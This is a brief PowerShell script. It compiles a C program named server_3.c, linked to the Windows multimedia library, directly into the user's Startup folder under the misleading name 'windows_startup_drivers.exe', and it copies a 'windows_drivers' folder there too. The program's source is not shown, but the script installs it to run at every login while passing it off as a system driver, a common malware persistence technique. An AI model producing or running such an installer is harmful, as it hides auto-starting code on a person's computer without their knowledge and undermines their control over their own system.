
$destinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$destinationPath2 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\windows_startup_drivers.exe"

gcc server_3.c -lwinmm -o $destinationPath2

$sourcePath = "windows_drivers"

Copy-Item -Path $sourcePath -Destination $destinationPath -Force -Recurse

